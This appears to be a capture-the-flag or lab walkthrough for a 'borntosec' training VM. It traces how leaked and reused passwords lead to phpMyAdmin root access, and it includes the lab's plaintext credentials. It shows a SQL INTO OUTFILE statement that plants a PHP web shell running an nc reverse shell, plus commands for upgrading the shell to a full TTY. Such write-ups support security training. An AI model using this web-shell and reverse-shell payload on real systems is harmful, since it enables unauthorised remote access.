# Port 443 (HTTPS)

- `https://<IP>/forum/index.php?id=6` leak credentials to access forum as `lmezard`

- User `lmezard` mail address can be found on account info page

- User `lmezard` use same password for `webmail` and `forum`

- User `lmezard` mail box leak credentials to access `phpmyadmin` as `root`

- Adding reverse shell backdoor via `phpmyadmin`:

```sql
SELECT '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <ip_addr> 4242 >/tmp/f"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```

Once connected, we can upgrade our shell into a full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
#[CTRL+z]
```

```bash
stty raw -echo
fg
#[ENTER]
#[ENTER]
```

We now have a full shell as `www-data`

## Credentials found

### `https://$ip/forum`

| Login | Password |
|-|-|
| `lmezard` | `!q\]Ej?*5K5cy*AJ` |

### `https://$ip/webmail`

| Login | Password |
|-|-|
| `laurie@borntosec.net` | `!q\]Ej?*5K5cy*AJ` |

### `https://$ip/phpmyadmin`

| Login | Password |
|-|-|
| `root` | `Fg-'kKXBj87E:aJ$` |
